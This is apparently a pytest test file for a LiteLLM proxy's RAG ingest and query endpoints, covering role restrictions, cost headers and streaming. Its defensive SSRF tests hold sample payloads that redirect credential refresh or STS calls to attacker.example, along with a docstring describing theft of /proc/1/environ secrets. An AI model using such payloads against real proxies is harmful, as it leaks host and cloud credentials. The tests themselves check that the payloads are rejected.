"""
Tests for RAG proxy endpoints.

Covers:
- internal_user_viewer restriction: can only ingest to existing vector stores (must provide vector_store_id)
"""

import io
import os
import sys
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi.testclient import TestClient

sys.path.insert(
    0, os.path.abspath("../../../../..")
)  # Adds the parent directory to the system path

from litellm.proxy._types import LitellmUserRoles, UserAPIKeyAuth
from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
from litellm.proxy.proxy_server import app


@pytest.fixture
def client_internal_user_viewer():
    """Test client with internal_user_viewer auth."""
    mock_auth = UserAPIKeyAuth(
        user_id="test_viewer_user",
        user_role=LitellmUserRoles.INTERNAL_USER_VIEW_ONLY.value,
    )
    original_overrides = app.dependency_overrides.copy()
    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides = original_overrides


@pytest.fixture
def client_internal_user():
    """Test client with internal_user auth (can create new vector stores)."""
    mock_auth = UserAPIKeyAuth(
        user_id="test_internal_user",
        user_role=LitellmUserRoles.INTERNAL_USER.value,
    )
    original_overrides = app.dependency_overrides.copy()
    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides = original_overrides


def test_internal_user_viewer_rag_ingest_without_vector_store_id_rejected(
    client_internal_user_viewer,
):
    """
    internal_user_viewer cannot create new vector stores - must provide vector_store_id.
    """
    # Form upload without vector_store_id (would create new store)
    response = client_internal_user_viewer.post(
        "/v1/rag/ingest",
        files={"file": ("sample.txt", io.BytesIO(b"test content"), "text/plain")},
        data={
            "request": '{"ingest_options":{"vector_store":{"custom_llm_provider":"openai"}}}'
        },
    )

    assert response.status_code == 403
    detail = response.json()
    assert "detail" in detail
    error_msg = (
        detail["detail"]["error"]
        if isinstance(detail["detail"], dict)
        else str(detail["detail"])
    )
    assert "internal_user_viewer" in error_msg
    assert "vector_store_id" in error_msg


def test_internal_user_viewer_rag_ingest_with_vector_store_id_passes_check(
    client_internal_user_viewer,
):
    """
    internal_user_viewer with vector_store_id passes the role check.
    (Actual ingest may fail due to missing API keys, but we get past 403.)
    """
    with patch(
        "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
        new_callable=AsyncMock,
        return_value={"vector_store_id": "vs_existing", "file_id": "file_123"},
    ):
        response = client_internal_user_viewer.post(
            "/v1/rag/ingest",
            files={"file": ("sample.txt", io.BytesIO(b"test content"), "text/plain")},
            data={
                "request": '{"ingest_options":{"vector_store":{"custom_llm_provider":"openai","vector_store_id":"vs_699651f6b6688191b0a210c00a686d20"}}}'
            },
        )

    # Should not be 403 (role check passed)
    assert response.status_code != 403, (
        f"internal_user_viewer with vector_store_id should pass role check. "
        f"Response: {response.json()}"
    )


def test_internal_user_rag_ingest_without_vector_store_id_allowed(client_internal_user):
    """
    internal_user can create new vector stores (no vector_store_id required).
    """
    with patch(
        "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
        new_callable=AsyncMock,
        return_value={"vector_store_id": "vs_new", "file_id": "file_123"},
    ):
        response = client_internal_user.post(
            "/v1/rag/ingest",
            files={"file": ("sample.txt", io.BytesIO(b"test content"), "text/plain")},
            data={
                "request": '{"ingest_options":{"vector_store":{"custom_llm_provider":"openai"}}}'
            },
        )

    # Should not be 403
    assert response.status_code != 403, (
        f"internal_user should be allowed to create new vector stores. "
        f"Response: {response.json()}"
    )


@pytest.mark.parametrize(
    "blocked_field",
    [
        "vertex_credentials",
        "vertex_ai_credentials",
        "aws_access_key_id",
        "aws_secret_access_key",
        "aws_session_token",
        "api_key",
        "api_base",
    ],
)
def test_rag_ingest_blocks_clientside_credentials(client_internal_user, blocked_field):
    """
    Credential fields in ingest_options.vector_store must be rejected.

    Accepting user-supplied credentials (e.g. vertex_credentials with
    type=external_account + credential_source.file=/proc/1/environ) allows
    any authenticated user to exfiltrate host secrets via SSRF through
    google-auth's identity_pool credential refresh.
    """
    payload = {
        "ingest_options": {
            "vector_store": {
                "custom_llm_provider": "vertex_ai",
                "vertex_project": "x",
                blocked_field: {
                    "type": "external_account",
                    "token_url": "http://attacker.example/sts",
                },
            }
        }
    }
    response = client_internal_user.post(
        "/v1/rag/ingest",
        json={
            **payload,
            "file": {
                "filename": "q.txt",
                "content": "dGVzdA==",
                "content_type": "text/plain",
            },
        },
    )
    assert (
        response.status_code == 400
    ), f"Expected 400 when '{blocked_field}' is set clientside, got {response.status_code}: {response.json()}"
    body = response.json()
    assert blocked_field in str(
        body
    ), f"Response should mention '{blocked_field}': {body}"
class TestRagIngestSSRFBlocked:
    """
    aws_sts_endpoint and related credential-redirect fields must be rejected
    in ingest_options.vector_store. Without this guard, any authenticated
    client can coerce the proxy to make a signed STS AssumeRole call to an
    attacker-controlled server, leaking the instance profile credentials.
    """

    @pytest.mark.parametrize(
        "field,value",
        [
            ("aws_sts_endpoint", "https://attacker.example/sts"),
            ("aws_web_identity_token", "fake-token"),
            ("aws_bedrock_runtime_endpoint", "https://attacker.example/bedrock"),
        ],
    )
    def test_ssrf_field_in_vector_store_config_rejected(
        self, field, value, client_internal_user
    ):
        payload = {
            "file_url": "https://example.com/doc.pdf",
            "ingest_options": {
                "vector_store": {
                    "custom_llm_provider": "bedrock",
                    field: value,
                }
            },
        }
        response = client_internal_user.post(
            "/v1/rag/ingest",
            json=payload,
        )
        assert response.status_code == 400, (
            f"{field} in ingest_options.vector_store should be rejected (400), "
            f"got {response.status_code}: {response.json()}"
        )
        body = response.json()
        detail = body.get("detail", {})
        error_text = (
            detail.get("error", "") if isinstance(detail, dict) else str(detail)
        )
        assert field in error_text, f"Error should name the offending field: {error_text}"

    def test_clean_bedrock_ingest_options_not_rejected(self, client_internal_user):
        with patch(
            "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
            new_callable=AsyncMock,
            return_value={"vector_store_id": "vs_bedrock", "file_id": "file_123"},
        ):
            response = client_internal_user.post(
                "/v1/rag/ingest",
                json={
                    "file_url": "https://example.com/doc.pdf",
                    "ingest_options": {
                        "vector_store": {"custom_llm_provider": "bedrock"}
                    },
                },
            )
        assert response.status_code != 400, (
            f"Clean Bedrock ingest_options should not be rejected: {response.json()}"
        )


def test_rag_query_returns_response_cost_header(client_internal_user):
    """
    /v1/rag/query must surface the completion cost via the
    x-litellm-response-cost response header, like /v1/chat/completions does.
    """
    from litellm.types.utils import ModelResponse

    mock_response = ModelResponse(
        id="chatcmpl-test",
        choices=[
            {
                "index": 0,
                "message": {"role": "assistant", "content": "The codename is AZURE-FALCON-42."},
                "finish_reason": "stop",
            }
        ],
        model="gpt-4o-mini",
        usage={"prompt_tokens": 35, "completion_tokens": 14, "total_tokens": 49},
    )
    mock_response._hidden_params["response_cost"] = 3.45e-06

    with patch(
        "litellm.proxy.rag_endpoints.endpoints.litellm.aquery",
        new_callable=AsyncMock,
        return_value=mock_response,
    ), patch("litellm.vector_store_registry", None), patch(
        "litellm.proxy.proxy_server.prisma_client", None
    ):
        response = client_internal_user.post(
            "/v1/rag/query",
            json={
                "model": "gpt-4o-mini",
                "messages": [{"role": "user", "content": "What is the codename?"}],
                "retrieval_config": {
                    "vector_store_id": "vs_test_123",
                    "custom_llm_provider": "openai",
                },
            },
        )

    assert response.status_code == 200, response.json()
    assert response.headers.get("x-litellm-response-cost") == "3.45e-06"


def test_rag_query_stream_returns_event_stream(client_internal_user):
    """
    A stream=true /v1/rag/query must return an SSE response. Returning the raw
    stream wrapper makes FastAPI try to serialize it, which raises and turns
    every streaming RAG query into a 500; the stream then never drains, so its
    single billing event (which carries the folded sub-call costs) never fires.
    """
    import litellm as litellm_module

    async def fake_aquery(**kwargs):
        return await litellm_module.acompletion(
            model="gpt-4o-mini",
            messages=[{"role": "user", "content": "What is the codename?"}],
            mock_response="The codename is AZURE-FALCON-42.",
            stream=True,
            api_key="test-key",
        )

    with patch(
        "litellm.proxy.rag_endpoints.endpoints.litellm.aquery",
        new=AsyncMock(side_effect=fake_aquery),
    ), patch("litellm.vector_store_registry", None), patch("litellm.proxy.proxy_server.prisma_client", None):
        response = client_internal_user.post(
            "/v1/rag/query",
            json={
                "model": "gpt-4o-mini",
                "messages": [{"role": "user", "content": "What is the codename?"}],
                "retrieval_config": {
                    "vector_store_id": "vs_test_123",
                    "custom_llm_provider": "openai",
                },
                "stream": True,
            },
        )

    assert response.status_code == 200, response.text
    assert response.headers.get("content-type", "").startswith("text/event-stream")
    assert '"object":"chat.completion.chunk"' in response.text
    assert "data: [DONE]" in response.text
